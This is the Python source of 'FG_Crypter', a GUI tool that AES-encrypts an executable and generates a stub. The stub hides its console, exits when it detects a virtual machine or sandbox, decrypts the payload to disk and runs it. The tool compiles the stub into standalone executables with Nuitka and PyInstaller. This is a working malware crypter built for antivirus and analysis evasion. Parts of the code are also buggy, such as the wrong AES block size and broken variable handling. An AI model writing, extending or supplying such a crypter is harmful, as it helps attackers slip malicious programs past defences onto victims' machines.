import os
import platform
import stat
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import tkinter as tk
from tkinter import filedialog, messagebox
import subprocess
import sys
import tkinter.ttk as ttk
from multiprocessing import Process, Queue
import queue

# Global variables for key and IV
key = None
iv = None

compilation_in_progress = False
compilation_steps = [0]  # Use a list to store the value as a mutable object
total_compilation_steps = 0
progress_window_nuitka = None
progress_window_pyinstaller = None

# Global variables for GUI elements
input_file_entry = None
output_file_entry = None
progress_var_nuitka = None
progress_var_pyinstaller = None
root = None

def generate_random_key(key_size):
    return os.urandom(key_size)

def generate_random_iv():
    return os.urandom(16)

def encrypt_file(input_file, output_file):
    global key, iv
    key = generate_random_key(32)
    iv = generate_random_iv()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    with open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
        f_out.write(iv)
        while True:
            chunk = f_in.read(32)
            if len(chunk) == 0:
                break
            elif len(chunk) % 32 != 0:
                chunk = pad(chunk, 32)
            encrypted_chunk = cipher.encrypt(chunk)
            f_out.write(encrypted_chunk)
    messagebox.showinfo("Encryption", "Encryption completed successfully.")
    display_encryption_info()

def display_encryption_info():
    messagebox.showinfo("Encryption Info", "Encryption completed successfully.\n"
                                           "Encryption Key: " + key.hex() + "\n"
                                           "Encryption IV: " + iv.hex())

def decrypt_file(input_file, output_file):
    key_input = key_input_entry.get()
    key = bytes.fromhex(key_input)
    iv_input = iv_input_entry.get()
    iv = bytes.fromhex(iv_input)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    with open(input_file, 'rb') as f_in, open(output_file, 'wb') as f_out:
        iv = f_in.read(16)  # Read the IV from the input file
        while True:
            encrypted_chunk = f_in.read(32)
            if len(encrypted_chunk) == 0:
                break
            decrypted_chunk = cipher.decrypt(encrypted_chunk)
            f_out.write(decrypted_chunk)
    messagebox.showinfo("Decryption", "Decryption completed successfully.")

def set_execution_permissions(file_path):
    if platform.system() == 'Linux':
        os.chmod(file_path, stat.S_IXUSR)
    elif platform.system() == 'Windows':
        renamed_file = file_path + '.exe'
        os.rename(file_path, renamed_file)
    else:
        messagebox.showwarning("Unsupported Platform", "Execution permissions not set due to unsupported platform.")

def create_stub(output_file):
    with open(output_file+'.exe', 'rb') as f:
        binary_data = f.read()

    with open('stub.py', 'w') as python_file:
        python_file.write(f"""import ctypes
h_console = ctypes.windll.kernel32.GetConsoleWindow()
ctypes.windll.user32.ShowWindow(h_console, 0)
from Crypto.Cipher import AES
import subprocess
import os
import sys
import platform
import psutil

def check_vm():
    # Check for common virtualization-related artifacts

    # Check if the machine's hostname contains common VM-related strings
    hostname = platform.node().lower()
    vm_strings = ["virtual", "vmware", "vbox", "qemu", "xen"]
    for vm_string in vm_strings:
        if vm_string in hostname:
            return True

    # Check for known virtualization software processes
    virtualization_processes = ["vmtoolsd.exe", "vboxservice.exe", "qemu-ga.exe"]
    for process in psutil.process_iter(attrs=['name']):
        if process.info['name'].lower() in virtualization_processes:
            return True

    # Check if the CPU vendor ID contains common VM-related strings
    cpu_vendor_id = platform.processor().lower()
    cpu_vm_strings = ["kvm", "vmware", "virtualbox"]
    for vm_string in cpu_vm_strings:
        if vm_string in cpu_vendor_id:
            return True

    # Check if it's running inside a virtualized environment
    if os.path.exists('/sys/hypervisor/uuid') or os.path.exists('/proc/scsi/scsi'):
        return True

    return False

if check_vm():
    quit()

# Get key and IV from user input
key = '{key.hex()}'
key = bytes.fromhex(key)
iv = '{iv.hex()}'
iv = bytes.fromhex(iv)

cipher = AES.new(key, AES.MODE_CBC, iv)

input_file = f'{output_file}.exe'
output_file = 'scantime.exe'

file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), input_file)
ofile_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), output_file)

with open(file_path, 'rb') as f_in, open(ofile_path, 'wb') as f_out:
    iv = f_in.read(16)  # Read the IV from the input file
    while True:
        encrypted_chunk = f_in.read(32)
        if len(encrypted_chunk) == 0:
            break
        decrypted_chunk = cipher.decrypt(encrypted_chunk)
        f_out.write(decrypted_chunk)

subprocess.run(ofile_path, shell=True)
sys.exit()
""")

def compile_with_nuitka_worker(input_file, output_file, progress_queue):
    global total_compilation_steps
    total_compilation_steps = 100

    def update_progress():
        if compilation_steps[0] < total_compilation_steps:
            compilation_steps[0] += 1
            progress_queue.put(compilation_steps[0])
            progress_window_nuitka.after(10, update_progress)
        else:
            compilation_in_progress = False

    progress_window_nuitka = tk.Toplevel(root)
    progress_window_nuitka.title("Nuitka Compilation Progress")

    progress_var_nuitka = tk.IntVar()
    progress_bar_nuitka = ttk.Progressbar(progress_window_nuitka, mode="determinate", variable=progress_var_nuitka, maximum=total_compilation_steps)
    progress_bar_nuitka.pack()

    progress_window_nuitka.after(10, update_progress)

    nuitka_command = (
        f'nuitka --mingw64 --onefile --assume-yes-for-downloads '
        f'--remove-output --include-data-file="{output_file}.exe=." '
        f'--output-filename=Crypted "stub.py"'
    )
    subprocess.run(nuitka_command, shell=True)
    progress_window_nuitka.destroy()

def compile_with_nuitka(input_file, output_file):
    progress_queue = Queue()
    p = Process(target=compile_with_nuitka_worker, args=(input_file, output_file, progress_queue))
    p.start()
    while p.is_alive():
        try:
            progress = progress_queue.get_nowait()
            progress_var_nuitka.set(progress)
        except queue.Empty:
            pass
        root.update_idletasks()
    p.join()

def compile_with_pyinstaller_worker(output_file, progress_queue):
    global total_compilation_steps, compilation_steps
    total_compilation_steps = 100

    def update_progress():
        if compilation_steps < total_compilation_steps:
            compilation_steps += 1
            progress_queue.put(compilation_steps)
            progress_window_pyinstaller.after(10, update_progress)
        else:
            compilation_in_progress = False

    progress_window_pyinstaller = tk.Toplevel(root)
    progress_window_pyinstaller.title("PyInstaller Compilation Progress")

    progress_var_pyinstaller = tk.IntVar()
    progress_bar_pyinstaller = ttk.Progressbar(progress_window_pyinstaller, mode="determinate", variable=progress_var_pyinstaller, maximum=total_compilation_steps)
    progress_bar_pyinstaller.pack()

    progress_window_pyinstaller.after(10, update_progress)

    pyinstaller_command = (
        f'pyinstaller --onefile stub.py --add-data "{output_file}.exe;." --name "py-crypted"'
    )
    subprocess.run(pyinstaller_command, shell=True)
    progress_window_pyinstaller.destroy()

def compile_with_pyinstaller(output_file):
    progress_queue = Queue()
    p = Process(target=compile_with_pyinstaller_worker, args=(output_file, progress_queue))
    p.start()
    while p.is_alive():
        try:
            progress = progress_queue.get_nowait()
            progress_var_pyinstaller.set(progress)
        except queue.Empty:
            pass
        root.update_idletasks()
    p.join()

def encrypt_button_click():
    input_file = input_file_entry.get()
    output_file = output_file_entry.get()
    if input_file and output_file:
        encrypt_file(input_file, output_file)
        set_execution_permissions(output_file)
        create_stub(output_file)
        
        # Compile with Nuitka
        compile_with_nuitka(input_file, output_file)

        # Compile with PyInstaller
        compile_with_pyinstaller(output_file)
        
        os.remove('stub.py')
        
        messagebox.showinfo("Stub Creation", "Stub creation completed successfully.")

def decrypt_button_click():
    input_file = input_file_entry.get()
    output_file = output_file_entry.get()
    if input_file and output_file:
        decrypt_file(input_file, output_file)

def create_gui():
    global input_file_entry, output_file_entry, progress_var_nuitka, progress_var_pyinstaller, root

    root = tk.Tk()
    root.title("FG_Crypter")

    def choose_input_file():
        input_file = filedialog.askopenfilename(title="Select Input File")
        input_file_entry.delete(0, tk.END)  # Clear the current entry
        input_file_entry.insert(0, input_file)  # Set the selected file in the entry

    def choose_output_file():
        output_file = filedialog.asksaveasfilename(title="Select Output File")
        output_file_entry.delete(0, tk.END)  # Clear the current entry
        output_file_entry.insert(0, output_file)  # Set the selected file in the entry

    input_file_label = tk.Label(root, text="Input File:")
    input_file_label.pack()
    input_file_entry = tk.Entry(root)
    input_file_entry.pack()
    input_file_button = tk.Button(root, text="Browse", command=choose_input_file)
    input_file_button.pack()

    output_file_label = tk.Label(root, text="Output File:")
    output_file_label.pack()
    output_file_entry = tk.Entry(root)
    output_file_entry.pack()
    output_file_button = tk.Button(root, text="Browse", command=choose_output_file)
    output_file_button.pack()

    encrypt_button = tk.Button(root, text="Encrypt File", command=encrypt_button_click)
    encrypt_button.pack()

    decrypt_button = tk.Button(root, text="Decrypt File", command=decrypt_button_click)
    decrypt_button.pack()

    quit_button = tk.Button(root, text="Quit", command=root.quit)
    quit_button.pack()

    # Initialize progress bars and variables
    progress_var_nuitka = tk.IntVar()
    progress_bar_nuitka = ttk.Progressbar(root, mode="determinate", variable=progress_var_nuitka, maximum=total_compilation_steps)
    progress_bar_nuitka.pack()

    progress_var_pyinstaller = tk.IntVar()
    progress_bar_pyinstaller = ttk.Progressbar(root, mode="determinate", variable=progress_var_pyinstaller, maximum=total_compilation_steps)
    progress_bar_pyinstaller.pack()

    root.mainloop()

if __name__ == "__main__":
    create_gui()
